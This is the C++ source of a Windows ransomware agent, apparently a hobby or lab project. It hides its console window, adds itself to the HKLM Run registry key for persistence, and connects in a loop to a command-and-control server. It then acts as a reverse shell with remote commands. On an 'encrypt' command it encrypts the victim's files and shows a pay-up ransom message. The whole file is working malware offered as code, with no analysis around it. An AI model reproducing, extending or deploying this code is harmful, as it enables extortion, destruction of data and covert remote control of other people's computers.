//Main headers

#include <winsock2.h>       //Socket
#include <windows.h>        //Used for WinApi calls
#include <stdio.h>
#include <tchar.h>
#include "encrypt_file.cpp"
#include "decrypt_file.cpp"

#pragma comment(lib, "Ws2_32.lib")
#define BUFF_LEN 1024


char current_directory[BUFF_LEN] = "";
SOCKET sock;

//adds exe to startup application list
void registry_add() {
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY hkey;
	RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegSetValueEx(hkey, "(Default)", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
	RegCloseKey(hkey);
}
void registry_delete() {
	HKEY hkey;
	RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegDeleteValue(hkey, "(Default)");
	RegCloseKey(hkey);
}
void whoami(char* buffer)
{
	DWORD bufferlen = BUFF_LEN;
	GetUserName(buffer, &bufferlen);
}

void hostname(char* buffer)
{
	DWORD bufferlen = BUFF_LEN;
	GetComputerName(buffer, &bufferlen);
}

void pwd(char* buffer)
{
	TCHAR tempvar[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, tempvar);
	strcat(buffer, tempvar);
}
//change directory
int cd(char* param) {
	int ret_val = SetCurrentDirectory(param);
	memset(current_directory, 0, sizeof(current_directory));
	pwd(current_directory);
	return ret_val;
}
//mimics behaviour of dir/ls functions
void dir(char* returnval) {
	char directory[BUFF_LEN] = "";
	strcat(directory, current_directory);
	strcat(directory, "\\*"); // get all files 
	WIN32_FIND_DATA data;
	HANDLE hFind = FindFirstFile(directory, &data); 

	if (hFind != INVALID_HANDLE_VALUE) { // Iterate over files in current directory
		do {
			strcat(returnval, "\t");
			strcat(returnval, data.cFileName);
			strcat(returnval, "\n");
		} while (FindNextFile(hFind, &data));
		FindClose(hFind);
	}
}
//checks if command is supported right now
int execute_command(char* command, char* buffer) {
	if (strlen(command) == 1 && command[0] == '\n') {
		return 0;
	}
	else if (strcmp(command, "shutdown\n") == 0 || strcmp(command, "exit\n") == 0) {
		if (strcmp(command, "shutdown\n") == 0)
			registry_delete();
		closesocket(sock);
		WSACleanup();
		exit(0);
	}
	else if (strcmp(command, "whoami\n") == 0) {
		whoami(buffer);
	}
	else if (strcmp(command, "hostname\n") == 0) {
		hostname(buffer);
	}
	else if (strcmp(command, "pwd\n") == 0) {
		pwd(buffer);
	}
	else if (strcmp(command, "dir\n") == 0) {
		dir(buffer);
	}
	else {
		char command_function[BUFF_LEN] = "";
		int command_len = strlen(command);
		int i = 0;
		for (i = 0; i < command_len; ++i)
		{
			if (command[i] == ' ')    //Stops at first space
			{
				break;
			}
			else
			{
				command_function[i] = command[i];
			}
		}
		char command_param[BUFF_LEN] = "";
		strcat(command_param, command + i + 1);
		command_param[strlen(command_param) - 1] = '\0'; // deletes last char which is newline
		if (strcmp(command_function, "cd") == 0) {	
			int ret_val = cd(command_param);
			if (ret_val == 0)
				strcat(buffer, "Invalid path");
			else
				return 0;
		}
		else if (strcmp(command_function, "encrypt") == 0) {
			int ret_val = encrypt_file(command_param);
			if (ret_val == 0)
				strcat(buffer, "Encryption failed");
			else {
				MessageBox(NULL, "Your files are encrypted, its time to pay!", "ByeBye", MB_OK | MB_ICONWARNING);
				return 0;
			}
				
		}
		else if (strcmp(command_function, "decrypt") == 0) {
			int ret_val = decrypt_file(command_param);
			if (ret_val == 0)
				strcat(buffer, "Decryption failed");
			else
				return 0;
		}
		else {
			strcat(buffer, "Invalid command");
		}
	}
	return 1;
}
//sends current directory to c2, for visual purpose only
void show_path() {
	char buffer[BUFF_LEN] = "";
	strcat(buffer, current_directory);
	strcat(buffer, ">");
	send(sock, buffer, strlen(buffer) + 1, 0);
}
//tries to connect to C2 using a loop
void connect_c2() {
	WSADATA wsaver;
	WSAStartup(MAKEWORD(2, 2), &wsaver);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(1337);
	while (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {}
}
//implements reverse shell - receive command, execute it and send output back
void receive_commands()
{
	show_path();
	char command[BUFF_LEN] = "";
	while (true)
	{
		recv(sock, command, BUFF_LEN, 0);
		char buffer[BUFF_LEN] = "";
		int ret_val = execute_command(command, buffer);
		if (ret_val == 0)
			goto RESET_BUFFERS;
		strcat(buffer, "\n");
		send(sock, buffer, strlen(buffer) + 1, 0);
	RESET_BUFFERS:
		memset(buffer, 0, sizeof(buffer));
		memset(command, 0, sizeof(command));

		//setups the directory line for next command
		show_path();
	}
	closesocket(sock);
	WSACleanup();
	registry_delete();
	exit(0);
}
int main()
{
	registry_add();
	pwd(current_directory);
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0); //0 to hide window
	connect_c2();
	receive_commands();
	return 0;
}
